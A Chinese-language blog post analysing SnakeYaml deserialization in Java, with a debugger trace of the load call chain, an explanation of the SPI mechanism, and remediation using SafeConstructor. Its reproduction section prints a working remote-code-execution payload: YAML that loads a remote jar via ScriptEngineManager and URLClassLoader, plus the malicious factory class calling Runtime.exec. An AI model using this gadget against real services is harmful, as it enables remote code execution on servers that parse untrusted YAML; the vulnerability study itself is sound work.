---
title: Java SnakeYaml反序列化
categories:
  - Web安全
tags:
  - SnakeYaml反序列化
  - 漏洞分析
  - JavaSec
toc: true 文章目录
author: BlBana
date: 2020-03-24 15:39:07
description:
comments:
original:
permalink:
---

> 开始研究Java安全相关技术了，最近开坑了Java反序列化漏洞的研究分析，在github上创了个研究[Java反序列化的Repo](https://github.com/BlBana/Learn-Java-Deserialization-Vulnerability)，列出了一些最近准备分析的反序列化漏洞，打算系统的整理下Java反序列化的知识。Repo中放 Demo 和 PoC 的代码，Blog里放详细的漏洞分析文章。本篇SnakeYaml反序列是第一篇文章，后续会按照列表内容持续跟进相关漏洞。

<!-- more -->

---

# Java SnakeYaml反序列化

# SnakeYaml简介

SnakeYaml用于yaml格式的解析，支持Java对象的序列化、反序列化

**Yaml在反序列化时，会调用类中的包含属性的setter方法**

# 序列化、反序列化

1. Yaml.load()：入参是一个字符串或者一个文件，经过序列化之后返回一个`Java`对象；
2. Yaml.loadAll()：入参是`Iterator`，可以批量反序列化`Iterator`中的成员；
3. Yaml.loadAs()：入参是`InputStream`，`Class Type`，按照指定的类型进行反序列化；
4. Yaml.dump()：同上
5. Yaml.dumpAll()：同上
6. Yaml.dumpAs()：同上

## 基本类型

- **List**

  ```java
  # test.yml
  
  - value1
  - value2
  - value3
  
  @Test
  public void testType() throws Exception {
      Yaml yaml = new Yaml();
      List<String> ret = (List<String>)yaml.load(this.getClass().getClassLoader()
              .getResourceAsStream("test.yml"));
      System.out.println(ret);
  }
  ```

- **Map**

  ```java
  # test2.yml
  
  sample1: 
      r: 10
  sample2:
      other: haha
  sample3:
      x: 100
      y: 100
  
  @Test
  public void test2() throws Exception {
      Yaml yaml = new Yaml();
      Map<String, Object> ret = (Map<String, Object>) yaml.load(this
              .getClass().getClassLoader().getResourceAsStream("test2.yaml"));
      System.out.println(ret);
  }
  ```

- **多片段转换**

  ```java
  # test3.yml
  
  ---
  sample1: 
      r: 10
  ---
  sample2:
      other: haha
  --- 
  sample3:
      x: 100
      y: 100
      
  @Test
  public void test3() throws Exception {
      Yaml yaml = new Yaml();
      Iterable<Object> ret = yaml.loadAll(this.getClass().getClassLoader()
              .getResourceAsStream("test3.yml"));
      for (Object o : ret) {
          System.out.println(o);
      }
  }
  ```

## 对象转换

### loadAs转换

```java
# address.yml
lines: |
  458 Walkman Dr.
  Suite #292
city: Royal Oak
state: MI
postal: 48046

public class Address {
    private String lines;
    private String city;
    private String state;
    private Integer postal;
}

@Test
public void testAddress() throws Exception {
    Yaml yaml = new Yaml();
    Address ret = yaml.loadAs(this.getClass().getClassLoader()
            .getResourceAsStream("address.yml"), Address.class);
    Assert.assertNotNull(ret);
    Assert.assertEquals("MI", ret.getState());
}
```

### 指定构造器

```java
@Test
public void testPerson2() {
    Yaml yaml = new Yaml(new Constructor(Person.class));
    Person ret = (Person) yaml.load(this.getClass().getClassLoader()
            .getResourceAsStream("person.yml"));
    Assert.assertNotNull(ret);
    Assert.assertEquals("MI", ret.getAddress().getState());
}
```

### 强制转换

```java
# person.yml
!!blbana.Person
given  : Chris
family : Dumars
address:
    lines: |
        458 Walkman Dr.
        Suite #292
    city    : Royal Oak
    state   : MI
    postal  : 48046

public class Person {
    private String given;
    private String family;
    private Address address;
}

@Test
public void testPerson() throws Exception {
    Yaml yaml = new Yaml();
    Person ret = (Person) yaml.load(this.getClass().getClassLoader()
            .getResourceAsStream("person.yml"));
    Assert.assertNotNull(ret);
    Assert.assertEquals("MI", ret.getAddress().getState());
}
```

> ”!!”用于强制类型转化，”!!blbana.Person”是将该对象转为blbana.Person类

    !!javax.script.ScriptEngineManager [
      !!java.net.URLClassLoader [[
        !!java.net.URL ["http://localhost:8000/"]
      ]]
    ]

## SnakeYaml反序列化过程

- User类

```java
package blbana.YamlTest;

public class User {
    String name;
    int age;

    public User() {
        System.out.println("User构造函数");
    }

    public String getName() {
        return name;
    }

    public void setName(String name) {
        this.name = name;
    }

    public String getAge() {
        return age;
    }

    public void setAge(String age) {
        this.age = age;
    }
}
```

- Yaml反序列化

```java
package blbana.YamlTest;

import org.yaml.snakeyaml.Yaml;

public class YamlDeserial {
    public static void main(String[] args) {
        User user = new User();
        user.setName("BlBana");
        Yaml yaml = new Yaml();
        String s = yaml.dump(user);
        System.out.println(s);
        User user1 = yaml.load(s);
    }
}
```

首先在`load`方法打下断点，获取到`StreamReader` 实际在构造方法中将Yaml内容放入到了`StringReader`实例中，然后调用`loadFormReader`方法

![https://blog-img-1252112827.cos.ap-chengdu.myqcloud.com/image/jpg/Java-SnakeYaml-Vuls/0.png](https://blog-img-1252112827.cos.ap-chengdu.myqcloud.com/image/jpg/Java-SnakeYaml-Vuls/0.png)

之后调用了基础构造器`BaseConstructor` 的`getSingleData`方法获取yaml的反序列化实例，type为Object类型

![https://blog-img-1252112827.cos.ap-chengdu.myqcloud.com/image/jpg/Java-SnakeYaml-Vuls/1.png](https://blog-img-1252112827.cos.ap-chengdu.myqcloud.com/image/jpg/Java-SnakeYaml-Vuls/1.png)

继续跟进`getSingleData`方法，先用`getSingleNode`将`StreamReader`中的`Yaml`字符串转换为Node对象，再经过一些判断后，调用`constructDocument`，其中使用`constructObject` 将node对象转换为指定类型的实例对象，在node中主要有两个关键属性：

- `Type`，用于指定构造实例对象的类型；
- `Tag`，用于指定构造实例对象的构造器类型；

![https://blog-img-1252112827.cos.ap-chengdu.myqcloud.com/image/jpg/Java-SnakeYaml-Vuls/2.png](https://blog-img-1252112827.cos.ap-chengdu.myqcloud.com/image/jpg/Java-SnakeYaml-Vuls/2.png)

![https://blog-img-1252112827.cos.ap-chengdu.myqcloud.com/image/jpg/Java-SnakeYaml-Vuls/3.png](https://blog-img-1252112827.cos.ap-chengdu.myqcloud.com/image/jpg/Java-SnakeYaml-Vuls/3.png)

跟进调试`constructObjectNoCheck` 中使用`constructor.construct`获取构造器处理`node`

![https://blog-img-1252112827.cos.ap-chengdu.myqcloud.com/image/jpg/Java-SnakeYaml-Vuls/4.png](https://blog-img-1252112827.cos.ap-chengdu.myqcloud.com/image/jpg/Java-SnakeYaml-Vuls/4.png)

`constructor.construct` 中获取node的构造器，并对node进行处理；可以看到在获取构造器的方法中，调用了`getClassForNode`从node中获取到了要反序列化的类对象，并将类对象放入到node的`type`属性中后面会利用反射动态获取实例对象，跟进一下`getClassForNode`方法

![https://blog-img-1252112827.cos.ap-chengdu.myqcloud.com/image/jpg/Java-SnakeYaml-Vuls/5.png](https://blog-img-1252112827.cos.ap-chengdu.myqcloud.com/image/jpg/Java-SnakeYaml-Vuls/5.png)

`getClassForNode` 中有两个关键方法调用，`getClassName`获取到了类名，`getClassForName`获取`Class`对象

![https://blog-img-1252112827.cos.ap-chengdu.myqcloud.com/image/jpg/Java-SnakeYaml-Vuls/6.png](https://blog-img-1252112827.cos.ap-chengdu.myqcloud.com/image/jpg/Java-SnakeYaml-Vuls/6.png)

- `getClassName`中当开头为固定字符串，就会截取后面的类名返回

  ![https://blog-img-1252112827.cos.ap-chengdu.myqcloud.com/image/jpg/Java-SnakeYaml-Vuls/7.png](https://blog-img-1252112827.cos.ap-chengdu.myqcloud.com/image/jpg/Java-SnakeYaml-Vuls/7.png)

- `getClassForName`中利用反射获取`User`的类对象

  ![https://blog-img-1252112827.cos.ap-chengdu.myqcloud.com/image/jpg/Java-SnakeYaml-Vuls/8.png](https://blog-img-1252112827.cos.ap-chengdu.myqcloud.com/image/jpg/Java-SnakeYaml-Vuls/8.png)

继续向下跟进，在`newInstance`中实例化了User类，进入`constructJavaBean2ndStep`

![https://blog-img-1252112827.cos.ap-chengdu.myqcloud.com/image/jpg/Java-SnakeYaml-Vuls/9.png](https://blog-img-1252112827.cos.ap-chengdu.myqcloud.com/image/jpg/Java-SnakeYaml-Vuls/9.png)

已经有了User实例，在`constructJavaBean2ndStep`中开始将node中的`nodeValue`放入User实例中

![https://blog-img-1252112827.cos.ap-chengdu.myqcloud.com/image/jpg/Java-SnakeYaml-Vuls/10.png](https://blog-img-1252112827.cos.ap-chengdu.myqcloud.com/image/jpg/Java-SnakeYaml-Vuls/10.png)

调用`constructObject`构造实例对象value，并调用`property.set`进行属性设置

![https://blog-img-1252112827.cos.ap-chengdu.myqcloud.com/image/jpg/Java-SnakeYaml-Vuls/11.png](https://blog-img-1252112827.cos.ap-chengdu.myqcloud.com/image/jpg/Java-SnakeYaml-Vuls/11.png)

跟进`MethodProperty.set` 利用反射调用User类的`setName`方法设置属性值

![https://blog-img-1252112827.cos.ap-chengdu.myqcloud.com/image/jpg/Java-SnakeYaml-Vuls/12.png](https://blog-img-1252112827.cos.ap-chengdu.myqcloud.com/image/jpg/Java-SnakeYaml-Vuls/12.png)

![https://blog-img-1252112827.cos.ap-chengdu.myqcloud.com/image/jpg/Java-SnakeYaml-Vuls/13.png](https://blog-img-1252112827.cos.ap-chengdu.myqcloud.com/image/jpg/Java-SnakeYaml-Vuls/13.png)


    // 调用链
    load()
    loadFormReader()
    	getSingleData()
    	constructDocument()
    	constructObject()
    		constructor.construct()
    		getClassForNode()
    			getClassName()
    			getClassForName()
    		construct()
    		constructJavaBean2ndStep()
    		property.set()


# Java SPI机制

这里需要提前了解一下Java SPI机制**（Service Provider Interface）**，是Java提供的一套用来被第三方实现或者扩展的API，它可以用来启用框架扩展和替换组件。

常见的SPI有JDBC，日志接口，Spring，Spring Boot相关starter组件，Dubbo，JNDI等

![https://blog-img-1252112827.cos.ap-chengdu.myqcloud.com/image/jpg/Java-SnakeYaml-Vuls/14.png](https://blog-img-1252112827.cos.ap-chengdu.myqcloud.com/image/jpg/Java-SnakeYaml-Vuls/14.png)

## 使用介绍

1. 当服务提供者提供了接口的一种具体实现后，在jar包的`META-INF/services`目录下创建一个以**“包名 + 接口名”**为命名的文件，内容为实现该接口的类的名称；
2. 接口实现类所在的jar包放在主程序的classpath中；
3. 主程序通过`java.util.ServiceLoder`动态装载实现模块，它通过在META-INF/services目录下的配置文件找到实现类的类名，利用反射动态把类加载到JVM；

## 使用示例

```java
// SPI.IShout

package SPI;

public interface IShout {
    void shout();
}

// SPI.Cat

package SPI;

public class Cat implements IShout {

    @Override
    public void shout() {
        System.out.println("Cat");
    }
}

// SPI.Dog

package SPI;

public class Dog implements IShout {
    @Override
    public void shout() {
        System.out.println("Dog");
    }
}

// SPIMain

package SPI;

import java.util.ServiceLoader;

public class SPIMain {
    public static void main(String[] args) {
        ServiceLoader<IShout> shouts = ServiceLoader.load(IShout.class);
        for(IShout s : shouts) {
            s.shout();
        }
    }
}
```

运行SPIMain后，Serviceloader会根据配置文件`META-INF/services/SPI.IShout` 获取到实现接口的类名，实例化后返回到`IShout s`中，最终调用每个类实例的`shout`方法

## 核心过程

调用load方法后，会返回一个`LazyIterator` 的实例对象

- `service`为要扫描的配置文件名
- `loader`为当前线程的`ClassLoader`

![https://blog-img-1252112827.cos.ap-chengdu.myqcloud.com/image/jpg/Java-SnakeYaml-Vuls/15.png](https://blog-img-1252112827.cos.ap-chengdu.myqcloud.com/image/jpg/Java-SnakeYaml-Vuls/15.png)

当开始遍历这个对象时，调用其`hasNext-->hasNextService, nex-->nextService`方法，在`nextService`中反射生成`Dog`和`Cat`对象，返回到`main`方法中调用

- `hasNextService` 解析`config`文件，获取要解析的接口实现类名
- `nextService` 实例化接口实现类并返回实例

![https://blog-img-1252112827.cos.ap-chengdu.myqcloud.com/image/jpg/Java-SnakeYaml-Vuls/16.png](https://blog-img-1252112827.cos.ap-chengdu.myqcloud.com/image/jpg/Java-SnakeYaml-Vuls/16.png)

## 安全风险

如果**攻击者可以根据接口类写恶意的实现类**，并且能通过**控制Jar包中META-INF/services目录中的SPI配置文件**，就会导致服务器端在通过SPI机制时调用攻击者写的恶意实现类导致任意代码执行。

## Gadget

- `ScriptEngineManager` 利用原理就是SPI机制

# SnakeYaml反序列化漏洞

## 影响范围

SnakelYaml全版本

## 漏洞类型

Yaml.load方法参数外部可控时，可以构造一个含有恶意垒的Yaml格式内容，服务端进行反序列化可以引起远程命令执行等风险

## 漏洞复现

```java
package blbana.YamlTest;

import org.yaml.snakeyaml.Yaml;

public class Payload {
    public static void main(String[] args) {
        String PoC = "!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL [\"http://127.0.0.1:8000\"]]]]\n";
        Yaml yaml = new Yaml();
        yaml.load(PoC);
    }
}
```

![https://blog-img-1252112827.cos.ap-chengdu.myqcloud.com/image/jpg/Java-SnakeYaml-Vuls/17.png](https://blog-img-1252112827.cos.ap-chengdu.myqcloud.com/image/jpg/Java-SnakeYaml-Vuls/17.png)

- RCE版本

```java
// PoC

package YamlTest;

import org.yaml.snakeyaml.Yaml;

public class Payload {
    public static void main(String[] args) {
        String PoC = "!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL [\"http://127.0.0.1:8000/yaml-payload.jar\"]]]]\n";
        Yaml yaml = new Yaml();
        yaml.load(PoC);
    }
}
```

```java
// yaml-payload.jar
// github URL: https://github.com/artsploit/yaml-payload/blob/master/src/artsploit/AwesomeScriptEngineFactory.java

package artsploit;

import javax.script.ScriptEngine;
import javax.script.ScriptEngineFactory;
import java.io.IOException;
import java.util.List;

public class AwesomeScriptEngineFactory implements ScriptEngineFactory {

    public AwesomeScriptEngineFactory() {
        try {  			 		Runtime.getRuntime().exec("/System/Applications/Calculator.app/Contents/MacOS/Calculator");
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    @Override
    public String getEngineName() {
        return null;
    }

    @Override
    public String getEngineVersion() {
        return null;
    }

    @Override
    public List<String> getExtensions() {
        return null;
    }

    @Override
    public List<String> getMimeTypes() {
        return null;
    }

    @Override
    public List<String> getNames() {
        return null;
    }

    @Override
    public String getLanguageName() {
        return null;
    }

    @Override
    public String getLanguageVersion() {
        return null;
    }

    @Override
    public Object getParameter(String key) {
        return null;
    }

    @Override
    public String getMethodCallSyntax(String obj, String m, String... args) {
        return null;
    }

    @Override
    public String getOutputStatement(String toDisplay) {
        return null;
    }

    @Override
    public String getProgram(String... statements) {
        return null;
    }

    @Override
    public ScriptEngine getScriptEngine() {
        return null;
    }
}
```

![https://blog-img-1252112827.cos.ap-chengdu.myqcloud.com/image/jpg/Java-SnakeYaml-Vuls/18.png](https://blog-img-1252112827.cos.ap-chengdu.myqcloud.com/image/jpg/Java-SnakeYaml-Vuls/18.png)

## 漏洞详情

从`yaml.load(PoC)`开始调试，前面的调用链和上述的User类反序列过程是一样的，主要看关键的几个类在构造时的情况

    // 调用链
    loadFormReader()
    	getSingleData()
    	constructDocument()
    	constructObject()
    		constructor.construct()
    		getClassForNode()
    			getClassName()
    			getClassForName()
    		construct()
    			c.newInstance()
    				ScriptEngineManager.init()
    				ScriptEngineManager.initEngines()
    				ServiceLoader.load()
    				itr.hasNext()
    				itr.next()
    					ServiceLoader.nextService()
    					Class.forName()
    					c.newInstance()

第一个节点类型为`SequenceNode`，使用`Constructor$ConstructSequence`构造方法进行解析，先根据当前节点`snode`的`value`大小生成`java.lang.reflect.Constructor`类型的List，**利用反射机制获取当前节点的所有构造器，并根据节点的Value数量选择对应参数数量的构造器**

![https://blog-img-1252112827.cos.ap-chengdu.myqcloud.com/image/jpg/Java-SnakeYaml-Vuls/19.png](https://blog-img-1252112827.cos.ap-chengdu.myqcloud.com/image/jpg/Java-SnakeYaml-Vuls/19.png)

接下来先获取类的构造器，然后循环将node中的所有Value调用`Constructor.this.constructObject(argumentNode)` 进行反序列化，获取value的实例对象，用于接下来实例化。

`constructObject`中会继续遍历解析yaml数据，按照以下顺序进行反序列化

- class java.lang.String （类对象） **Construct$ConstructScalar** （构造器）
- class java.net.URL （类对象） **Construct$ConstructSequence** （构造器）
- class java.net.URLClassLoader（类对象） **Construct$ConstructSequence** （构造器）
- class javax.script.ScriptEngineManager（类对象） **Construct$ConstructSequence **（构造器）

调试过程都差不多，只有最后一个节点类型使用构造器不一样

![https://blog-img-1252112827.cos.ap-chengdu.myqcloud.com/image/jpg/Java-SnakeYaml-Vuls/20.png](https://blog-img-1252112827.cos.ap-chengdu.myqcloud.com/image/jpg/Java-SnakeYaml-Vuls/20.png)

最终使用`public javax.script.ScriptEngineManager(java.lang.ClassLoader)` 构造器实例化`javax.script.ScriptEngineManager` ,`argumentListx`为参数列表

![https://blog-img-1252112827.cos.ap-chengdu.myqcloud.com/image/jpg/Java-SnakeYaml-Vuls/21.png](https://blog-img-1252112827.cos.ap-chengdu.myqcloud.com/image/jpg/Java-SnakeYaml-Vuls/21.png)

![https://blog-img-1252112827.cos.ap-chengdu.myqcloud.com/image/jpg/Java-SnakeYaml-Vuls/22.png](https://blog-img-1252112827.cos.ap-chengdu.myqcloud.com/image/jpg/Java-SnakeYaml-Vuls/22.png)

继续跟进`public javax.script.ScriptEngineManager(java.lang.ClassLoader)`构造方法，接下来就是`ScriptEngineManager`实例化的过程

![https://blog-img-1252112827.cos.ap-chengdu.myqcloud.com/image/jpg/Java-SnakeYaml-Vuls/23.png](https://blog-img-1252112827.cos.ap-chengdu.myqcloud.com/image/jpg/Java-SnakeYaml-Vuls/23.png)

跟进`initEngines`看见实例化了`ServiceLoader`类，这里用到了上面提到的**SPI机制**，可以动态的加载指定配置文件中的接口的实现类

![https://blog-img-1252112827.cos.ap-chengdu.myqcloud.com/image/jpg/Java-SnakeYaml-Vuls/24.png](https://blog-img-1252112827.cos.ap-chengdu.myqcloud.com/image/jpg/Java-SnakeYaml-Vuls/24.png)

循环调用`LazyIterator`的 `hasNext` 和 `next` 方法，分别 **获取接口实现类** 和 **实例化接口实现类**

![https://blog-img-1252112827.cos.ap-chengdu.myqcloud.com/image/jpg/Java-SnakeYaml-Vuls/25.png](https://blog-img-1252112827.cos.ap-chengdu.myqcloud.com/image/jpg/Java-SnakeYaml-Vuls/25.png)

尝试在本地的`META-INF/services/javax.script.ScriptEngineFactory` 中加载`config`资源，抛出异常

![https://blog-img-1252112827.cos.ap-chengdu.myqcloud.com/image/jpg/Java-SnakeYaml-Vuls/26.png](https://blog-img-1252112827.cos.ap-chengdu.myqcloud.com/image/jpg/Java-SnakeYaml-Vuls/26.png)

之后会先将本地jar包中符合条件的接口类实例化，然后通过`URLClassLoader`加载远程jar包，并拉取至本地的临时文件中，解析jar包中的配置文件`META-INF/services/javax.script.ScriptEngineFactory` 获取到目标接口实现类`artsploit.AwesomeScriptEngineFactory`，利用反射机制实例化目标类，类中的静态代码块被执行，成功执行命令

![https://blog-img-1252112827.cos.ap-chengdu.myqcloud.com/image/jpg/Java-SnakeYaml-Vuls/27.png](https://blog-img-1252112827.cos.ap-chengdu.myqcloud.com/image/jpg/Java-SnakeYaml-Vuls/27.png)

## 漏洞修复

- 禁止`Yaml.load`参数可控
- 若需要反序列化，则要过滤参数内容，使用`SafeConstructor`对反序列化内容进行白名单控制

## 安全编码

```java
import org.yaml.snakeyaml.constructor.SafeConstructor;

public static Map readConfigFile(String filename) throws IOException {
    Map ret;
    Yaml yaml = new Yaml(new SafeConstructor());  // SafeConstructor是自带的白名单类
    InputStream inputStream = new FileInputStream(new File(filename));

    try {
        ret = (Map)yaml.load(inputStream);
    } finally {
        inputStream.close();
    }

    if(ret == null) {
        ret = new HashMap();
    }

    return new HashMap(ret);
}
```



# 参考链接

- [https://github.com/artsploit/yaml-payload/](https://github.com/artsploit/yaml-payload/)

- [https://www.mi1k7ea.com/2019/11/29/Java-SnakeYaml反序列化漏洞/](https://www.mi1k7ea.com/2019/11/29/Java-SnakeYaml%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/)

- [https://www.jishuwen.com/d/prBc/zh-hk](https://www.jishuwen.com/d/prBc/zh-hk)
- https://juejin.im/post/5b9b1c115188255c5e66d18c